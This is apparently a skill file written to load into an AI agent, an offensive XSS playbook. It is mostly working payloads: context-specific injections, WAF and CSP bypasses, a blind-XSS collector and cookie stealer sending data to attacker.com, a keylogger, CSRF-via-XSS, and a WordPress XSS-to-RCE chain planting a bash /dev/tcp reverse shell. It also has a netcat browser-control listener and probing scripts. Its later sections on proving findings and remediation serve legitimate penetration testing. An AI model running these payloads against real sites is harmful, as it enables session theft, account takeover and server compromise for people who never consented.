---
name: xss-cross-site-scripting
description: >-
  XSS playbook. Use when user-controlled content reaches HTML, attributes, JavaScript, DOM sinks, uploads, or multi-context rendering paths.
---

# SKILL: Cross-Site Scripting (XSS) — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: This skill covers non-obvious XSS techniques, context-specific payload selection, WAF bypass, CSP bypass, and post-exploitation. Assume the reader already knows `<script>alert(1)</script>` — this file only covers what base models typically miss. For real-world CVE cases, HttpOnly bypass strategies, XS-Leaks side channels, and session fixation attacks, load the companion [SCENARIOS.md](./SCENARIOS.md).

## 0. RELATED ROUTING

### Extended Scenarios

Also load [SCENARIOS.md](./SCENARIOS.md) when you need:
- Django debug page XSS (CVE-2017-12794) — duplicate key error → unescaped exception → XSS
- UTF-7 XSS for legacy IE environments (`+ADw-script+AD4-`)
- HttpOnly bypass methodology — proxy-the-browser, session riding, CSRF-via-XSS
- XS-Leaks side channel attacks — timing oracle, cache probing, `performance.now()` measurement
- Session fixation via XSS — pre-set session ID before victim login
- DOM clobbering techniques for CSP-restricted environments

### Advanced Tricks

Also load [ADVANCED_XSS_TRICKS.md](./ADVANCED_XSS_TRICKS.md) when you need:
- mXSS / DOMPurify bypass — namespace confusion, `<noscript>` parsing differential, form/table restructuring
- DOM Clobbering — property override via `id`/`name`, HTMLCollection, deep property chains
- Modern framework XSS — React `dangerouslySetInnerHTML`, Vue `v-html`, Angular `bypassSecurityTrust*`, Next.js SSR
- Trusted Types bypass — default policy abuse, non-TT sinks, policy passthrough
- Service Worker XSS persistence — malicious SW registration, fetch interception, post-patch survival
- PDF/SVG/MathML XSS vectors, polyglot payloads, browser-specific tricks
- XS-Leaks & side channels — timing oracle, frame counting, cache probing, error event oracle

Before broad payload spraying, you can first load:

- [upload insecure files](../upload-insecure-files/SKILL.md) when you need the full upload path: validation, storage, preview, and sharing behavior

### Quick context picks

| Context | First Pick | Backup |
|---|---|---|
| HTML body | `<svg onload=alert(1)>` | `<img src=1 onerror=alert(1)>` |
| Quoted attribute | `" autofocus onfocus=alert(1)//` | `" onmouseover=alert(1)//` |
| JavaScript string | `'-alert(1)-'` | `'</script><svg onload=alert(1)>` |
| URL / href sink | `javascript:alert(1)` | `data:text/html,<svg onload=alert(1)>` |
| Tag body like `title` | `</title><svg onload=alert(1)>` | `</textarea><svg onload=alert(1)>` |
| SVG / XML sink | `<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>` | XHTML namespace payload |

```html
<svg onload=alert(1)>
<img src=1 onerror=alert(1)>
" autofocus onfocus=alert(1)//
'</script><svg onload=alert(1)>
javascript:alert(1)
data:text/html,<svg onload=alert(1)>
```

---

## 1. INJECTION CONTEXT MATRIX

Identify context **before** picking a payload. Wrong context = wasted attempts.

| Context | Indicator | Opener | Payload |
|---|---|---|---|
| HTML outside tag | `<b>INPUT</b>` | `<svg onload=` | `<svg onload=alert(1)>` |
| HTML attribute value | `value="INPUT"` | `"` close attr | `"onmouseover=alert(1)//` |
| Inline attr, no tag close | Quoted, `>` stripped | Event injection | `"autofocus onfocus=alert(1)//` |
| Block tag (title/script/textarea) | `<title>INPUT</title>` | Close tag first | `</title><svg onload=alert(1)>` |
| href / src / data / action | link or form | Protocol | `javascript:alert(1)` |
| JS string (single quote) | `var x='INPUT'` | Break string | `'-alert(1)-'` or `'-alert(1)//` |
| JS string with escape | Backslash escaping | Double escape | `\'-alert(1)//` |
| JS logical block | Inside if/function | Close + inject | `'}alert(1);{'` |
| JS anywhere on page | `<script>...INPUT` | Break script | `</script><svg onload=alert(1)>` |
| XML page (`text/xml`) | XML content-type | XML namespace | `<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</x:script>` |

---

## 2. MULTI-REFLECTION ATTACKS

When input reflects in **multiple places** on the same page — single payload triggers from all points:

```html
<!-- Double reflection -->
'onload=alert(1)><svg/1='
'>alert(1)</script><script/1='
*/alert(1)</script><script>/*

<!-- Triple reflection -->
*/alert(1)">'onload="/*<svg/1='
`-alert(1)">'onload="`<svg/1='
*/</script>'>alert(1)/*<script/1='

<!-- Two separate inputs (p= and q=) -->
p=<svg/1='&q='onload=alert(1)>
```

---

## 3. ADVANCED INJECTION VECTORS

### DOM Insert Injection (when reflection is in DOM not source)
Input inserted via `.innerHTML`, `document.write`, jQuery `.html()`:
```html
<img src=1 onerror=alert(1)>
<iframe src=javascript:alert(1)>
```
For URL-controlled resource insertion:
```html
data:text/html,<img src=1 onerror=alert(1)>
data:text/html,<iframe src=javascript:alert(1)>
```

### PHP_SELF Path Injection
When URL itself is reflected in form `action`:
```
https://target.com/page.php/"><svg onload=alert(1)>?param=val
```
Inject between `.php` and `?`, using leading `/`.

### File Upload XSS

**Filename injection** (when filename is reflected):
```
"><svg onload=alert(1)>.gif
```

**SVG upload** (stored XSS via image upload accepting SVG):
```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
```

**Metadata injection** (when EXIF is reflected):
```bash
exiftool -Artist='"><svg onload=alert(1)>' photo.jpeg
```

### postMessage XSS (no origin check)
When page has `window.addEventListener('message', ...)` without origin validation:
```html
<iframe src="TARGET_URL" onload="frames[0].postMessage('INJECTION','*')">
```

### postMessage Origin Bypass
When origin IS checked but uses `.includes()` or prefix match:
```
http://facebook.com.ATTACKER.com/crosspwn.php?target=//victim.com/page&msg=<script>alert(1)</script>
```
Attacker controls `facebook.com.ATTACKER.com` subdomain.

### XML-Based XSS
Response has `text/xml` or `application/xml`:
```html
<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</x:script>
<x:script xmlns:x="http://www.w3.org/1999/xhtml" src="//attacker.com/1.js"/>
```

### Script Injection Without Closing Tag
When there IS a `</script>` tag later in the page:
```html
<script src=data:,alert(1)>
<script src=//attacker.com/1.js>
```

---

## 4. CSP BYPASS TECHNIQUES

### JSONP Endpoint Bypass (allow-listed domain has JSONP)
```html
<script src="https://www.google.com/complete/search?client=chrome&jsonp=alert(1);">
</script>
```

### AngularJS CDN Bypass (allow-listed `ajax.googleapis.com`)
```html
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js"></script>
<x ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</x>
```

### Angular Expressions (server encodes HTML but AngularJS evaluates)
When `{{1+1}}` evaluates to `2` on page — classic CSTI indicator:
```javascript
// Angular 1.x sandbox escape:
{{constructor.constructor('alert(1)')()}}

// Angular 1.5.x:
{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}
```

### base-uri Injection (CSP without base-uri restriction)
```html
<base href="https://attacker.com/">
```
Relative `<script src=...>` loads from attacker's server.

### DOM-based via Dangling Markup
When CSP blocks script but allows `img`:
```html
<img src='https://attacker.com/log?
```
Leaks subsequent page content to attacker.

---

## 5. FILTER AND WAF BYPASS

### Parameter Name Attack (WAF checks value not name)
When parameter names are reflected (e.g., in JSON output):
```
?"></script><base%20c%3D=href%3Dhttps:\mysite>
```
Payload is the **parameter name**, not value.

### Encoding Chains
```
%253C  → double-encoded <
%26lt; → HTML entity double-encoding
<%00h2 → null byte injection
%0d%0a → CRLF inside tag
```
Test sequence: reflect → encoding behavior → identify filter logic → mutate.

### Tag Mutation (blacklist bypass)
```html
<ScRipt>  ← case variation
</script/x>  ← trailing garbage
<script  ← incomplete (relies on later >)
<%00iframe  ← null byte
<svg/onload=  ← slash instead of space
```

### Fragmented Injection (strip-tags bypass)
Filter strips `<x>...</x>`:
```
"o<x>nmouseover=alert<x>(1)//
"autof<x>ocus o<x>nfocus=alert<x>(1)//
```

### Vectors Without Event Handlers
```html
<form action=javascript:alert(1)><input type=submit>
<form><button formaction=javascript:alert(1)>click
<isindex action=javascript:alert(1) type=submit value=click>
<object data=javascript:alert(1)>
<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)>>
<math><brute href=javascript:alert(1)>click
```

---

## 6. SECOND-ORDER XSS

**Definition**: Input is stored (often normalized/HTML-encoded), then later **retrieved** and inserted into DOM without re-encoding.

**Classic trigger payload** (bypasses immediate HTML encoding):
```
<svg/onload&equals;alert(1)>
```
Check: profile fields, display names, forum posts — anywhere data is stored, then re-rendered in a different context (e.g., admin panel vs user-facing).

**Stored → Admin context XSS**: most impactful — sign up with crafted username, wait for admin to view user list.

---

## 7. BLIND XSS METHODOLOGY

Every parameter that is **not immediately reflected** should be tested for blind XSS:
- Contact forms, feedback fields
- User-agent / referer  
- Registration fields
- Error log injections

**Blind XSS callback payload** (remote JS file approach):
```html
"><script src=//attacker.com/bxss.js></script>
```

**Minimal collector** (hosted at `bxss.js`):
```javascript
var d = document;
var msg = 'URL: '+d.URL+'\nCOOKIE: '+d.cookie+'\nDOM:\n'+d.documentElement.innerHTML;
fetch('https://attacker.com/collect?'+encodeURIComponent(msg));
```

Use **XSS Hunter** or similar blind XSS platform for automated collection.

---

## 8. XSS EXPLOITATION CHAIN

### Cookie Steal
```javascript
fetch('//attacker.com/?c='+document.cookie)
// HttpOnly protected cookies → not stealable via JS, need CSRF or session fixation instead
```

### Keylogger
```javascript
document.onkeypress = function(e) {
    fetch('//attacker.com/k?k='+encodeURIComponent(e.key));
}
```

### CSRF via XSS (bypasses CSRF protection, reads CSRF token from DOM)
```javascript
var r = new XMLHttpRequest();
r.open('GET', '/account/settings', false);
r.send();
var token = /csrf_token['":\s]+([^'"<\s]+)/.exec(r.responseText)[1];
var f = new XMLHttpRequest();
f.open('POST', '/account/email/change', true);
f.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
f.send('email=attacker@evil.com&csrf='+token);
```

### WordPress XSS → RCE (admin session + Hello Dolly plugin):
```javascript
p = '/wp-admin/plugin-editor.php?';
q = 'file=hello.php';
s = '<?=`bash -i >& /dev/tcp/ATTACKER/4444 0>&1`;?>';
a = new XMLHttpRequest();
a.open('GET', p+q, 0); a.send();
$ = '_wpnonce=' + /nonce" value="([^"]*?)"/.exec(a.responseText)[1] +
    '&newcontent=' + encodeURIComponent(s) + '&action=update&' + q;
b = new XMLHttpRequest();
b.open('POST', p+q, 1);
b.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
b.send($);
b.onreadystatechange = function(){ if(this.readyState==4) fetch('/wp-content/plugins/hello.php'); }
```

### Browser Remote Control (JS command shell)
```javascript
// Injected into victim:
setInterval(function(){
    with(document)body.appendChild(createElement('script')).src='//ATTACKER:5855'
},100)
```
```bash
# Attacker listener:
while :; do printf "j$ "; read c; echo $c | nc -lp 5855 >/dev/null; done
```

---

## 9. DECISION TREE

```
Test XSS entry point
├── Input reflected in response?
│   ├── YES → Identify context (HTML / JS / attr / URL)
│   │         → Select context-appropriate payload
│   │         → If blocked → check filter behavior
│   │         │   → Try encoding, case mutation, fragmentation
│   │         │   → Check if parameter NAME is reflected (WAF gap)
│   │         └── Success → escalate (cookie steal / CSRF / RCE)
│   └── NO  → Is it stored? → Inject blind XSS payload
│             Is it in DOM? → Check JS source for unsafe sinks
│                             (innerHTML, eval, document.write, location.href)
└── CSP present?
    ├── Check for JSONP endpoints on allow-listed domains
    ├── Check for AngularJS on CDN allow-list
    ├── Check for base-uri missing → <base> injection
    └── Check for unsafe-eval or unsafe-inline exceptions
```

---

## 10. XSS TESTING PROCESS (ZSEANO METHOD)

1. **Step 1** — Test non-malicious tags: `<h2>`, `<img>`, `<table>` — are they reflected raw?
2. **Step 2** — Test incomplete tags: `<iframe src=//attacker.com/c=` (no closing `>`) 
3. **Step 3** — Encoding probes: `<%00h2`, `%0d`, `%0a`, `%09`, `%253C`  
4. **Step 4** — If filtering `<script>` and `onerror` but NOT `<script ` (without close): `<script src=//attacker.com?c=`
5. **Step 5** — Blacklist check: does `<svg>` work? Does `<ScRiPt>` work?
6. Note: **the same filter likely exists elsewhere** — if they filter `<script>` in search, do they filter it in file upload filename? In profile bio?

**Key insight**: Filter presence = vulnerability exists, developer tried to patch. Chase that thread across the entire application.

---

## 11. CONFIRMING THE FINDING — EXECUTION, NOT REFLECTION

Reflected angle brackets are **not** XSS. The finding requires that the browser *parses and executes*
your payload in the target origin. That is a higher bar than "the server echoed my string", and it is
the bar triage applies.

| Step | Question | What it proves |
|---|---|---|
| 1 | Is the payload reflected **unencoded** into a renderable context? | the parser will see it as markup, not text |
| 2 | Does it **execute** — an alert, a `fetch`, a DOM mutation? | script execution in the origin |
| 3 | Which **context** — HTML body, attribute, JS string, URL, CSS? | fixes the exact escaping the app must add |
| 4 | Which **parser** — HTML, SVG, MathML, template? | some sanitisers miss non-HTML foreign content |
| 5 | Does it run in the **victim's authenticated session**? | origin privileges, not the tester's own session |
| 6 | What can it **reach** — `document.cookie`, CSRF token, `/api/me`? | the impact class: session theft vs defacement vs token exfil |

**Encoded reflection is a negative result.** `&lt;script&gt;` in the response body is the control
working. Report the payload that survived *unencoded* and executed — and state the context.

**Prove execution with a side effect you can observe server-side**: a callback to a listener you
control, a unique token appended to a request the page makes, or a DOM change captured with a
screenshot. `alert(1)` in your own browser is a technician's proof; the report needs a callback.

**Match severity to reach.** Stored/blind XSS that fires for an admin session is high or critical;
self-XSS that requires the victim to paste your payload is typically informational. The difference
is whether the attacker can *induce* execution, so document the delivery vector.

---

## 12. EVIDENCE STANDARD

| Item | Why |
|---|---|
| The **exact request** including the parameter and encoding used | the bypass is byte-exact; `%253C` and `<` are different findings |
| The **raw response** showing the payload unencoded in its context | proves the server emitted markup, not text |
| The **execution proof** (listener callback log, screenshot of DOM state, exfiltrated nonce) | separates execution from reflection — the single most important artefact |
| The **context and parser** (HTML body / attribute / JS string / SVG) | tells the fix owner precisely which encoder to add |
| The **delivery vector** for stored/blind (form, profile field, header, file name) and where it renders | proves an attacker can induce execution |
| For CSP claims: the **`Content-Security-Policy` header** and the payload that executes despite it | distinguishes a real CSP bypass from a missing CSP |
| **Negative control** — the same input with `<` properly encoded does not execute | proves the difference is the app's encoding failure |
| **Victim-privilege evidence** (admin session, exfiltrated CSRF token) | severity: stored-XSS-as-admin ≠ self-XSS |

Report the **context and the bypass**: "the `q` parameter is reflected unencoded inside an
`<input value=...>` attribute, and `" autofocus onfocus=fetch('//evil/'+document.cookie)` breaks out
because only `<` and `>` are filtered", never "the search page is vulnerable to XSS".

### False positives — do not report these

| Observation | Why it is not a finding |
|---|---|
| Payload appears in the response as text / HTML-encoded | the browser will not parse it as markup |
| Payload appears only inside a JSON response | not rendered as HTML in that context (check the consumer) |
| Payload executes in your own browser console, not via the app | self-XSS or devtools artefact |
| `alert(1)` fires but the page is a `sandbox`ed iframe without `allow-scripts` | no origin access |
| The reflection sits inside a `<textarea>` or `<title>` and does not break out | text context; needs the correct closing token |
| CSP blocks the payload — you only get a console violation report | the control is working; report a bypass only if one exists |
| Payload stripped by a sanitiser but the *encoded* form remains | sanitisation working as designed |
| Only `javascript:` in an `href` on a **`rel=noopener` new tab** that the victim must click | insufficient to prove execution; document the interaction requirement |

**Always confirm with the browser, not the response body.** A reflected `<script>` may be inside a
context that never executes.

---

## 13. REMEDIATION REFERENCE

1. **Context-aware output encoding, applied at the sink** — the fix is not a sanitiser at the input; it is the correct encoder at each output: HTML-entity for HTML body, attribute-value encoding including the surrounding quotes, JavaScript string escaping, URL encoding, CSS escaping. One payload can need three different encodings in one page.
2. **Never build markup by string concatenation with untrusted data** — use templating engines with autoescaping on by default (`Jinja2` autoescape, React's JSX, Go `html/template`) and treat any `|safe`, `dangerouslySetInnerHTML`, or `v-html` as a security-reviewed exception.
3. **Sanitise rich text with a maintained allowlist library, on the server** — DOMPurify (server-side via jsdom) or a vetted equivalent, configured with an explicit tag/attribute allowlist. A hand-written regex is defeated by the parser differentials in §3.
4. **Deploy CSP as defence-in-depth, not as the primary fix** — a nonce- or hash-based `script-src` with no `unsafe-inline` meaningfully raises the bar. `unsafe-inline`, `unsafe-eval`, and wildcard hosts reduce it to noise; do not report CSP as remediation if it contains them.
5. **Use `HttpOnly` and `SameSite` on session cookies** — narrows the classic cookie-theft impact to token-in-body theft. It does not fix XSS, but it changes what a successful XSS can take.
6. **Encode for the correct URL context** — in `href`/`src`, allowlist schemes (`https`, `mailto`) rather than relying on a denylist of `javascript:`; browser parsing of whitespace, entities, and control characters defeats naive denylists.
7. **Treat DOM sinks as server-side-equivalent vulnerabilities** — `innerHTML`, `outerHTML`, `document.write`, `insertAdjacentHTML`, `eval`, and `setTimeout(string)` must take no untrusted data; use `textContent` and `setAttribute`.
8. **Fix the client-side routing and `postMessage` handlers** — fragment-based sinks and unvalidated `message` origins turn a static page into a stored-XSS surface (DOM XSS); validate `event.origin` and never `eval` message data.
9. **Add `trusted-types` where the application is large** — it converts every DOM-sink assignment into a reviewable policy and catches the sinks static analysis misses.
10. **Scan and regression-test in CI** — run DOM and reflected XSS scanners against every build, plus unit tests asserting that each known payload from this file is encoded in the output. Fixed XSS regresses whenever a template or framework is upgraded.
11. **Reduce the blast radius for stored XSS** — isolate admin interfaces on separate origins, mark session cookies `HttpOnly`, require re-authentication for sensitive actions, and alert on anomalous outbound requests from authenticated sessions.

---

---

## 14. EXECUTION PRIMITIVES

XSS is proven by **script executing in a browser against the target's origin, with the encoded context
identified and the blocked control**. Every block ends at execution, not at reflection.

### 15.1 Establish the reflection and the encoding context

```bash
HOST="https://target.example"
# THE REFLECTION TEST: send a unique marker and find EVERY place it lands in the response
MARK="xss$(date +%s)"
curl -sS "$HOST/search?q=$MARK" -o /tmp/refl.html -D /tmp/refl.hdr
grep -o ".\{0,80\}$MARK.\{0,80\}" /tmp/refl.html | head -20
# THE CONTEXT: what wraps the marker decides the payload entirely
python3 - <<'PY'
import re
html = open("/tmp/refl.html").read()
m = re.search(r"(.{60})xss\d+(.{60})", html, re.S)
print("context around the reflection:")
print(m.group(0).replace("\n", " ") if m else "<not reflected>")
print()
print("classify:  in text  |  in an attribute  |  in a URL  |  in a script  |  in a comment")
print("the payload differs for each, and the wrong payload proves nothing")
PY
# THE ENCODED CONTROL: the same marker with the dangerous characters, which must be encoded
curl -sS "$HOST/search?q=%3Cscript%3E$MARK%3C%2Fscript%3E" | grep -o ".\{0,60\}$MARK.\{0,60\}" | head -5
```

**The context classification decides everything.** A payload for a text context does not work in an
attribute, and a report that sends `<script>alert(1)</script>` everywhere and declares the site safe is
the most common error in this family.

### 15.2 The payload per context

```python
# generate the payload from the CONTEXT, not from a list
CONTEXTS = {
  "html_text":        '"><img src=x onerror=alert(1)>' if False else '<img src=x onerror=alert(1)>',
  "double_attr":      '"><img src=x onerror=alert(1)>',
  "single_attr":      "'><img src=x onerror=alert(1)>",
  "unquoted_attr":    ' onmouseover=alert(1) x=',
  "href_javascript":  'javascript:alert(1)',
  "href_data":        'data:text/html,<script>alert(1)</script>',
  "script_string":    "';alert(1);//",
  "script_template":  "${alert(1)}",
  "json_value":       '\\u003cimg src=x onerror=alert(1)\\u003e',
  "comment":          '--><img src=x onerror=alert(1)><!--',
  "svg":              '<svg onload=alert(1)>',
  "noscript":         '</noscript><img src=x onerror=alert(1)>',
}
for k, v in CONTEXTS.items():
    print(f"{k:18} {v}")
print()
print("THE RULE: pick the entry matching the context you classified in 15.1. If it does not execute,")
print("the context is wrong - re-classify, do not try the next payload at random.")
```

**One payload per context, chosen deliberately.** Trying payloads until one fires produces a finding you
cannot explain, and an unexplainable finding is not reportable.

### 15.3 Execution detection, which must not depend on the alert box

```python
# a self-hosted collector is the only reliable execution signal; alert() is blocked in many clients
import http.server, socketserver, threading, random, string
TOKEN = "".join(random.choices(string.ascii_lowercase + string.digits, k=12))
hits = []

class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if TOKEN in self.path:
            hits.append(self.path); print("EXECUTION CONFIRMED:", self.path[:200])
        self.send_response(200); self.send_header("Content-Type", "image/gif"); self.end_headers()
        self.wfile.write(b"GIF89a\x01\x00\x01\x00\x00\xff\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x00;")
    def log_message(self, *a): pass

socketserver.TCPServer.allow_reuse_address = True
srv = socketserver.TCPServer(("0.0.0.0", 8000), H)
threading.Thread(target=srv.serve_forever, daemon=True).start()
print(f"collector on :8000, token {TOKEN}")
print(f"payload: <img src=x onerror=\"fetch('https://ATTACKER:8000/{TOKEN}?c='+encodeURIComponent(document.cookie))\">")
print("the collector entry is the execution proof; the alert box is not")
```

**The collector entry with your token is the execution proof.** `alert(1)` is blocked, stripped, or
unobserved in most test setups, and a screenshot of a dialog is weaker evidence than a logged request.

### 15.4 The three-way classification: raw, encoded, and executed

```bash
python3 - <<'PY'
import requests, re
HOST = "https://target.example"
MARK = "XSSM"

def probe(payload):
    r = requests.get(f"{HOST}/search", params={"q": payload}, timeout=10)
    raw = payload in r.text                                  # appears verbatim
    enc = ("&lt;" in r.text and payload in r.text) or ("&quot;" in r.text)
    dangerous = bool(re.search(r"<script|<img|<svg|onerror=|javascript:", r.text, re.I))
    return r.status_code, raw, dangerous, r.text[:200]

CASES = {
    "benign":            "hello",
    "plain_script":      f"<script>{MARK}</script>",
    "img_onerror":       f'<img src=x onerror="{MARK}">',
    "encoded_script":    f"&lt;script&gt;{MARK}&lt;/script&gt;",
    "double_encoded":    f"%253Cscript%253E{MARK}",
}
print("%-18s %-6s %-10s %-12s %s" % ("case", "code", "verbatim?", "dangerous?", "note"))
for k, v in CASES.items():
    c, raw, dang, _ = probe(v)
    note = "payload is live in the DOM" if raw and dang else ("encoded - safe" if not raw else "inspect")
    print("%-18s %-6s %-10s %-12s %s" % (k, c, raw, dang, note))
print()
print("A FINDING is: verbatim true AND dangerous true AND the collector fires when a browser loads it.")
print("Verbatim-without-dangerous is a partial encoding that may still be exploitable in another context.")
PY
```

**Verbatim plus the collector firing plus the context explained.** Reflection alone is not a finding, and
the encoded control row is what shows the filter is doing something.

### 15.5 Stored XSS, which needs extraction as well as execution

```bash
# the stored form requires a write, a read on a DIFFERENT page, and the collector firing THERE
MARK="xssstored$(date +%s)"
# 1) the write
curl -sS -X POST -H 'Content-Type: application/json' -H "Cookie: $SESSION" \
  -d "{\"comment\":\"<img src=x onerror=alert(1)>$MARK\"}" "$HOST/api/comments" | head -c 200; echo
# 2) the read on the page another user sees - this is where the storage becomes impact
curl -sS -H "Cookie: $OTHER_SESSION" "$HOST/thread/1" -o /tmp/stored.html
grep -c "$MARK" /tmp/stored.html
python3 -c "
h=open('/tmp/stored.html').read()
import re
m=re.search(r'.{60}'+r'xssstored\d+'+r'.{60}', h, re.S)
print('stored context:', m.group(0).replace(chr(10),' ') if m else '<not present>')"
# 3) the collector entry from the OTHER user's browser load is the proof
# and 4) the cleanup, verified
curl -sS -X DELETE -H "Cookie: $SESSION" "$HOST/api/comments/<id>" | head -c 120; echo
curl -sS -H "Cookie: $SESSION" "$HOST/api/comments/<id>" -o /dev/null -w 'deleted %{http_code} (404 expected)\n'
```

**The collector firing on another user's page load is the proof of stored XSS.** A marker present in your
own response is reflection; the cross-page load is stored, and the deletion is the cleanup.

### 15.6 The browser check, and why curl is not enough

```python
# the DOM can execute a payload curl never triggers: a framework that writes the value into innerHTML
# run the browser check with a headless browser and read the collector, not the console
print("Headless check, with the collector as the signal:")
print("""
from playwright.sync_api import sync_playwright
with sync_playwright() as p:
    b = p.chromium.launch()
    pg = b.new_page()
    pg.goto("https://target.example/search?q=" + payload)
    pg.wait_for_timeout(3000)     # give the payload time to fetch the collector
    b.close()
# the finding is the collector entry, not the page content
""")
print()
print("Use the browser when: the sink is a DOM sink (innerHTML, document.write, eval),")
print("the payload requires a second navigation, or the app is a SPA that renders after load.")
print("A curl-only test MISSES every DOM-based XSS, which is the majority of modern cases.")
```

**A curl-only test misses every DOM XSS.** The report must state whether the confirmation used a browser,
because a DOM sink reached through `location.hash` never appears in any server response.

### 15.7 The end-to-end harness

```bash
python3 - <<'PY'
import re
print("For every candidate sink, record:")
for row in ["the URL and parameter (or the write endpoint for stored)",
            "the reflection context: text, attribute, URL, script, or comment",
            "the payload chosen for that context, and why",
            "whether the response contained it VERBATIM or encoded",
            "the encoded control's response, which proves the filter acts",
            "the collector hit: timestamp, token, and the page that loaded it",
            "the browser used (headless is acceptable; curl alone is not)",
            "the interaction required: none, a click, or a navigation",
            "for stored: the second page and the second session that loaded it",
            "the cleanup for stored: the delete request and the 404 verification"]:
    print("  -", row)
print()
print("A report row with no collector hit is a reflection, not an XSS. Remove it.")
PY
```

**Collector hit or remove the row.** This is the discipline the entire family reduces to.

---

## 15. RELATED SIBLINGS - LOAD TOGETHER

- [waf-bypass-techniques](../waf-bypass-techniques/SKILL.md) - the filter-level bypasses that precede execution
- [csp-bypass-advanced](../csp-bypass-advanced/SKILL.md) - what to do when the page carries a CSP
- [ghost-bits-cast-attack](../ghost-bits-cast-attack/SKILL.md) - the byte-level bypasses for an over-eager filter
- [dangling-markup-injection](../dangling-markup-injection/SKILL.md) - the technique that needs no script at all
- [xss-cross-site-scripting](../xss-cross-site-scripting/SKILL.md) - this document
